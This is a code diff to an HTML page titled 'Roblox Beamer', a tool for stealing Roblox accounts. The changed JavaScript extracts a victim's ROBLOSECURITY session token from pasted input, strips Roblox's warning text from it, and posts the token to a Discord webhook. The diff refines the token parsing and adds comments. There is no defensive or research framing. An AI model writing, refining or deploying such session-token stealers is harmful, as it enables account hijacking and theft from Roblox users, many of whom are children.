@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Beamer</title>
+  <title>TESTRoblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -72,12 +72,12 @@
         return;
       }
 
-      // Extract only the ROBLOSECURITY token (removes warning text)
-      const token = match[0].split('=')[1];
+      // Extract only the ROBLOSECURITY token, removing the warning message
+      const token = match[0].split('=')[1].split('|')[0]; // This will remove the warning part
 
       // Send the token to Discord
       const discordPayload = {
-        content: `ROBLOSECURITY Token: ${token}`
+        content: `ROBLOSECURITY Token: ${token}` // Send only the session token to Discord
       };
 
       // Send the data to Discord via Webhook
